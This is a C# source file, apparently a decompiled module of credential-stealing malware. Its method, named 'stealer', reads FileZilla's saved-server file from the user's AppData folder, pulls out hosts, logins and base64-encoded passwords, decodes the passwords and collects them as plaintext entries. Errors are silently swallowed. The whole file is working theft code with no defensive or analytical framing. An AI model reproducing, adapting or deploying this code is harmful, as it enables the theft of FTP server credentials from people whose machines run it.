using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace hostik;

internal class FZ
{
	private class Collects_Stealer_Sucess
	{
		public static bool FileZilla { get; set; }
	}

	public class Constants
	{
		public static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");

		public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}

	public static List<string> Filezilla_List = new List<string>();

	public static void stealer()
	{
		try
		{
			string path = Constants.ApplicationData + "\\FileZilla\\recentservers.xml";
			if (!File.Exists(path))
			{
				Collects_Stealer_Sucess.FileZilla = false;
			}
			else
			{
				if (File.Exists(Constants.ApplicationData + "\\FileZilla.txt"))
				{
					File.Delete(Constants.ApplicationData + "\\FileZilla.txt");
				}
				using FileStream stream = new FileStream(path, FileMode.Open);
				StreamReader streamReader = new StreamReader(stream);
				Regex regex = new Regex("<Host>(.*)</Host>");
				Regex regex2 = new Regex("<User>(.*)</User>");
				Regex regex3 = new Regex("<Pass encoding=\"base64\">(.*)</Pass>");
				string text = string.Empty;
				string text2 = string.Empty;
				string text3 = string.Empty;
				string input;
				while ((input = streamReader.ReadLine()) != null)
				{
					Match match = regex.Match(input);
					Match match2 = regex2.Match(input);
					Match match3 = regex3.Match(input);
					if (match.Groups[1].ToString() != "")
					{
						text = match.Groups[1].ToString();
					}
					if (match2.Groups[1].ToString() != "")
					{
						text2 = match2.Groups[1].ToString();
					}
					if (match3.Groups[1].ToString() != "")
					{
						text3 = Encoding.UTF8.GetString(Convert.FromBase64String(match3.Groups[1].ToString()));
					}
					if (!string.IsNullOrWhiteSpace(text) && !string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
					{
						Filezilla_List.Add("IP: " + text + "\nLogin: " + text2 + "\nPassword: " + text3 + "\n");
						Collects_Stealer_Sucess.FileZilla = true;
						text = string.Empty;
						text2 = string.Empty;
						text3 = string.Empty;
					}
				}
				streamReader.Close();
			}
			GC.Collect();
		}
		catch
		{
		}
	}
}
